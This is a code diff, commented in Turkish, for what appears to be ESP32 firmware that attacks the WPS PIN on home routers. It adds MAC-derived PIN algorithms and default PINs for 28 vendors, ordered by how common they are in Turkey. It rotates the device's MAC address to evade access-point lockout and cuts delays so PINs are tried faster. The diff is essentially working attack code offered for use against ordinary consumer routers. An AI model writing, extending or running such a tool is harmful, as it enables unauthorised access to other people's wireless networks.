+    case VENDOR_GEMTEK:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: mac24 * 2 (bazı TTNet branded)
+      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
+      // Gemtek fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Iskratel (Si2000, Innbox — Türkiye/Balkan ISP) ───────────────────────
+    case VENDOR_ISKRATEL:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: mac24 XOR 0xF0F0F0 (Innbox serisi)
+      add_calc(pins, count, (mac24 ^ 0xF0F0F0UL) % 10000000UL);
+      // Iskratel fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Bilinmeyen vendor — kapsamlı genel algoritmalar ──────────────────────
     default:
       add_calc(pins, count, mac24 % 10000000UL);
-      // Linksys / Cisco
+      // Linksys / Cisco sağa kaydırma
       add_calc(pins, count, (mac32 >> 1) % 10000000UL);
-      // Genel XOR
+      // Genel XOR tabanlı
       {
         uint32_t x = (bssid[2] ^ bssid[5]) | ((uint32_t)(bssid[3] ^ bssid[4]) << 8);
         add_calc(pins, count, (mac24 ^ x) % 10000000UL);
       }
-      // ARRIS / Motorola
+      // ARRIS / Motorola mac48
       add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
-      // Technicolor / Thomson
+      // Technicolor / Thomson * 3
       add_calc(pins, count, (mac24 * 3UL) % 10000000UL);
+      // mac32 tam
+      add_calc(pins, count, mac32 % 10000000UL);
       break;
   }
 }
@@ -930,7 +1496,7 @@ static int8_t wps_try_one(const uint8_t *bssid, int channel, const char *pin) {
 
   while (wps_evt_result == 0 && millis() < deadline) {
     web_interface_handle_client();
-    delay(20);   // 40ms'den 20ms'ye — daha hızlı polling
+    delay(10);
   }
 
   esp_wifi_wps_disable();
@@ -942,23 +1508,84 @@ static int8_t wps_try_one(const uint8_t *bssid, int channel, const char *pin) {
 
 // ─── PIN listesi oluştur ──────────────────────────────────────────────────────
 // Vendor PIN'leri önce gelir (istatistiksel olarak daha başarılı)
-#define MAX_VENDOR_PINS  32
-static char all_pins[COMMON_PIN_COUNT + MAX_VENDOR_PINS + 4][9];
+// VENDOR_UNKNOWN ise tüm 28 vendor algoritması baştan sona denenir.
+#define MAX_VENDOR_PINS_PER_VENDOR  8
+// 28 vendor × 8 pin = 224 + 59 ortak + 4 buffer
+#define ALL_PINS_MAX  (28 * MAX_VENDOR_PINS_PER_VENDOR + COMMON_PIN_COUNT + 4)
+static char all_pins[ALL_PINS_MAX][9];
 static int  all_pin_count = 0;
+
+// Tüm bilinen vendor enum değerleri — Türkiye pazar yaygınlığına göre sıralı.
+// Bilinmeyen vendor saldırısında bu sırayla PIN üretilir; en yaygın vendor'lar önce gelir.
+static const wps_vendor_t ALL_VENDORS[] = {
+  // ── Tier-1: Türk Telekom/TTNet ana dağıtım modemleri (en yaygın) ─────────
+  VENDOR_ZTE,         // #1 — ZXHN H108N/H168N/F660, TTNet VDSL/Fiber
+  VENDOR_HUAWEI,      // #2 — HG8245/HG8247 ONT, TTNet/Superonline Fiber
+  VENDOR_SAGEMCOM,    // #3 — F@st 3686/3890, TTNet Fiber kutu modemi
+  VENDOR_ARCADYAN,    // #4 — VGV752/VGV7519, Vodafone TR ana kutu
+  VENDOR_ZYXEL,       // #5 — VMG3312/AMG1302, Superonline/TTNet VDSL
+
+  // ── Tier-2: Yaygın tüketici ve operatör OEM'leri ─────────────────────────
+  VENDOR_TPLINK,      // #6 — Archer/TL-WR/Deco, tüm operatörler + perakende
+  VENDOR_SERCOMM,     // #7 — Vodafone/Turkcell markalı OEM modem
+  VENDOR_GEMTEK,      // #8 — TTNet/Turkcell markalı OEM modem
+  VENDOR_TECHNICOLOR, // #9 — TG582/DGA4132, ISP dağıtımlı
+  VENDOR_TENDA,       // #10 — AC6/N301/F3, bütçe segment çok yaygın
+
+  // ── Tier-3: Orta yaygınlıkta tüketici ve ISP ekipmanı ────────────────────
+  VENDOR_MERCUSYS,    // #11 — MW/MR serisi, TP-Link alt markası, hızla büyüyor
+  VENDOR_DLINK,       // #12 — DIR/DWR/DSL-2750, uzun süredir yaygın
+  VENDOR_NETGEAR,     // #13 — R6/R7/Nighthawk, orta-üst segment
+  VENDOR_ASUS,        // #14 — RT-AC/RT-AX/GT, oyuncu/ev premium
+  VENDOR_SAGEM,       // #15 — F@st 1500/2604, eski TTNet ADSL dönemi
+  VENDOR_COMTREND,    // #16 — AR-5381/VR-3025, ISP OEM VDSL
+  VENDOR_COMPAL,      // #17 — CH7465/CH7466, ISP kablo OEM
+  VENDOR_CISCO,       // #18 — DPC3825/EPC3825, ISP kablo/fiber kutu
+
+  // ── Tier-4: Düşük yaygınlıkta / niş segmentler ───────────────────────────
+  VENDOR_ISKRATEL,    // #19 — Si2000/Innbox, bazı bölgesel ISP'ler
+  VENDOR_XIAOMI,      // #20 — AX3200/4A/AC2100, büyüyen pazar payı
+  VENDOR_ARRIS,       // #21 — SBG/TG, kablo altyapısı (TR'de sınırlı)
+  VENDOR_ACTIONTEC,   // #22 — GT701/MI424, nadir operatör dağıtımı
+  VENDOR_LINKSYS,     // #23 — WRT/EA/MR, Cisco sonrası azalan pazar
+  VENDOR_BELKIN,      // #24 — F7D/F9K, düşük pazar payı
+  VENDOR_FRITZ,       // #25 — 7490/7590, Almanya'da yaygın, TR'de nadir
+
+  // ── Tier-5: Çok nadir / kurumsal / profesyonel ───────────────────────────
+  VENDOR_BUFFALO,     // #26 — WHR/WSR, Japonya kökenli, TR'de çok az
+  VENDOR_MIKROTIK,    // #27 — hAP/RB, SOHO/ISP altyapı, ev kullanımı nadir
+  VENDOR_NETIS,       // #28 — WF/N serisi, düşük kalite, çok nadir
+};
+static const int ALL_VENDORS_COUNT = (int)(sizeof(ALL_VENDORS) / sizeof(ALL_VENDORS[0]));
+
+// Yardımcı: bir vendor'ın PIN'lerini all_pins'e duplikat kontrolüyle ekle
+static void add_vendor_pins(const uint8_t *bssid, wps_vendor_t v) {
+  char vp[MAX_VENDOR_PINS_PER_VENDOR][9];
+  int  vc = 0;
+  vendor_pins(bssid, v, vp, vc);
+  for (int i = 0; i < vc && all_pin_count < ALL_PINS_MAX; i++) {
+    bool dup = false;
+    for (int j = 0; j < all_pin_count; j++) {
+      if (strncmp(all_pins[j], vp[i], 8) == 0) { dup = true; break; }
+    }
+    if (!dup) memcpy(all_pins[all_pin_count++], vp[i], 9);
+  }
+}
 
 static void build_pin_list(const uint8_t *bssid, wps_vendor_t vendor) {
   all_pin_count = 0;
 
-  // 1. Vendor PIN'leri
-  char vp[MAX_VENDOR_PINS][9];
-  int  vc = 0;
-  vendor_pins(bssid, vendor, vp, vc);
-  for (int i = 0; i < vc && all_pin_count < (int)(sizeof(all_pins)/9); i++)
-    memcpy(all_pins[all_pin_count++], vp[i], 9);
+  if (vendor == VENDOR_UNKNOWN) {
+    // Vendor bilinmiyor → tüm vendor algoritmaları sırayla dene
+    for (int v = 0; v < ALL_VENDORS_COUNT; v++)
+      add_vendor_pins(bssid, ALL_VENDORS[v]);
+  } else {
+    // Vendor biliniyor → sadece o vendor'ın PIN'lerini ekle
+    add_vendor_pins(bssid, vendor);
+  }
 
-  // 2. Ortak PIN'ler (vendor kopyalarını tekrar ekleme)
-  for (int i = 0; COMMON_PINS[i] && all_pin_count < (int)(sizeof(all_pins)/9); i++) {
-    // Duplikat kontrolü
+  // Ortak PIN'leri sona ekle (duplikatları atla)
+  for (int i = 0; COMMON_PINS[i] && all_pin_count < ALL_PINS_MAX; i++) {
     bool dup = false;
     for (int j = 0; j < all_pin_count; j++) {
       if (strncmp(all_pins[j], COMMON_PINS[i], 8) == 0) { dup = true; break; }
@@ -1004,26 +1631,41 @@ void wps_start_attack(int target_index) {
 
   // Vendor adını belirle
   switch (vendor) {
-    case VENDOR_ZTE:      strncpy(wps_vendor_name, "ZTE",       31); break;
-    case VENDOR_HUAWEI:   strncpy(wps_vendor_name, "Huawei",    31); break;
-    case VENDOR_ZYXEL:    strncpy(wps_vendor_name, "Zyxel",     31); break;
-    case VENDOR_TPLINK:   strncpy(wps_vendor_name, "TP-Link",   31); break;
-    case VENDOR_SAGEMCOM: strncpy(wps_vendor_name, "Sagemcom",  31); break;
-    case VENDOR_ARCADYAN: strncpy(wps_vendor_name, "Arcadyan",  31); break;
-    case VENDOR_DLINK:    strncpy(wps_vendor_name, "D-Link",    31); break;
-    case VENDOR_NETGEAR:  strncpy(wps_vendor_name, "Netgear",   31); break;
-    case VENDOR_ASUS:     strncpy(wps_vendor_name, "ASUS",      31); break;
-    case VENDOR_LINKSYS:  strncpy(wps_vendor_name, "Linksys",   31); break;
-    case VENDOR_BELKIN:   strncpy(wps_vendor_name, "Belkin",    31); break;
-    case VENDOR_TENDA:    strncpy(wps_vendor_name, "Tenda",     31); break;
-    case VENDOR_MERCUSYS: strncpy(wps_vendor_name, "Mercusys",  31); break;
-    default:              strncpy(wps_vendor_name, "Bilinmeyen", 31); break;
+    case VENDOR_ZTE:         strncpy(wps_vendor_name, "ZTE",          31); break;
+    case VENDOR_HUAWEI:      strncpy(wps_vendor_name, "Huawei",       31); break;
+    case VENDOR_ZYXEL:       strncpy(wps_vendor_name, "Zyxel",        31); break;
+    case VENDOR_TPLINK:      strncpy(wps_vendor_name, "TP-Link",      31); break;
+    case VENDOR_SAGEMCOM:    strncpy(wps_vendor_name, "Sagemcom",     31); break;
+    case VENDOR_ARCADYAN:    strncpy(wps_vendor_name, "Arcadyan",     31); break;
+    case VENDOR_DLINK:       strncpy(wps_vendor_name, "D-Link",       31); break;
+    case VENDOR_NETGEAR:     strncpy(wps_vendor_name, "Netgear",      31); break;
+    case VENDOR_ASUS:        strncpy(wps_vendor_name, "ASUS",         31); break;
+    case VENDOR_LINKSYS:     strncpy(wps_vendor_name, "Linksys",      31); break;
+    case VENDOR_BELKIN:      strncpy(wps_vendor_name, "Belkin",       31); break;
+    case VENDOR_TENDA:       strncpy(wps_vendor_name, "Tenda",        31); break;
+    case VENDOR_MERCUSYS:    strncpy(wps_vendor_name, "Mercusys",     31); break;
+    case VENDOR_TECHNICOLOR: strncpy(wps_vendor_name, "Technicolor",  31); break;
+    case VENDOR_FRITZ:       strncpy(wps_vendor_name, "AVM Fritz!Box",31); break;
+    case VENDOR_ARRIS:       strncpy(wps_vendor_name, "Arris/Motorola",31); break;
+    case VENDOR_XIAOMI:      strncpy(wps_vendor_name, "Xiaomi",       31); break;
+    case VENDOR_BUFFALO:     strncpy(wps_vendor_name, "Buffalo",      31); break;
+    case VENDOR_MIKROTIK:    strncpy(wps_vendor_name, "MikroTik",     31); break;
+    case VENDOR_COMPAL:      strncpy(wps_vendor_name, "Compal",       31); break;
+    case VENDOR_SERCOMM:     strncpy(wps_vendor_name, "Sercomm",      31); break;
+    case VENDOR_NETIS:       strncpy(wps_vendor_name, "Netis/Wavlink",31); break;
+    case VENDOR_CISCO:       strncpy(wps_vendor_name, "Cisco",        31); break;
+    case VENDOR_SAGEM:       strncpy(wps_vendor_name, "Sagem",        31); break;
+    case VENDOR_COMTREND:    strncpy(wps_vendor_name, "Comtrend",     31); break;
+    case VENDOR_ACTIONTEC:   strncpy(wps_vendor_name, "Actiontec",    31); break;
+    case VENDOR_GEMTEK:      strncpy(wps_vendor_name, "Gemtek",       31); break;
+    case VENDOR_ISKRATEL:    strncpy(wps_vendor_name, "Iskratel",     31); break;
+    default:                 strncpy(wps_vendor_name, "Bilinmeyen",   31); break;
   }
 
   build_pin_list(wps_targets[target_index].bssid, vendor);
 
   WiFi.mode(WIFI_MODE_APSTA);
-  delay(100);
+  delay(50);
   esp_wifi_set_max_tx_power(84);
   esp_wifi_set_ps(WIFI_PS_NONE);
 
@@ -1097,7 +1739,7 @@ void wps_loop() {
   // ── MAC rotasyonu — her WPS_MAC_ROTATE_EVERY denemede bir ────────────────
   if (wps_attempt > 0 && (wps_attempt % WPS_MAC_ROTATE_EVERY) == 0) {
     rotate_sta_mac();
-    delay(200);  // AP'nin yeni MAC'i tanıması için kısa süre ver
+    delay(80);
   }
 
   // ── PIN dene ──────────────────────────────────────────────────────────────
